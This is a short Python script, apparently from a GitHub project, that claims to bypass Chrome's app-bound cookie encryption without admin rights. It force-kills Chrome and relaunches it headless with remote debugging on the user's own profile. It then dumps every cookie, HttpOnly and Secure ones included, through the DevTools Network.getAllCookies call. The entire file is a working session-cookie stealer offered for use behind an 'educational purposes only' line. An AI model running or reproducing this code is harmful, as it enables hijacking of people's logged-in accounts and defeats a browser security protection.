"""
Bypass Chrome v20 appbound encryption and extract cookies using Chrome Remote Debugging without admin rights.
Including HTTP Only and Secure cookies.

Developed by: github.com/thewh1teagle  
License: MIT  
For educational purposes only.  
Usage:
pip install websocket-client requests
python main.py
"""
import requests
import websocket
import json
import subprocess
import os

DEBUG_PORT = 9222
DEBUG_URL = f'http://localhost:{DEBUG_PORT}/json'
CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
USER_DATA_DIR = rf'{LOCAL_APP_DATA}\google\chrome\User Data'

def get_debug_ws_url():
    res = requests.get(DEBUG_URL)
    data = res.json()
    return data[0]['webSocketDebuggerUrl'].strip()

def kill_chrome():
    subprocess.run('taskkill /F /IM chrome.exe', check=False, shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_debugged_chrome():
    subprocess.Popen([CHROME_PATH, f'--remote-debugging-port={DEBUG_PORT}', '--remote-allow-origins=*', '--headless', f'--user-data-dir={USER_DATA_DIR}'], stdout=subprocess.DEVNULL)


if __name__ == "__main__":
    kill_chrome()
    start_debugged_chrome()
    url = get_debug_ws_url()
    ws = websocket.create_connection(url)
    ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
    response = ws.recv()
    response = json.loads(response)
    cookies = response['result']['cookies']
    print(json.dumps(cookies, indent=4))
    ws.close()
    kill_chrome()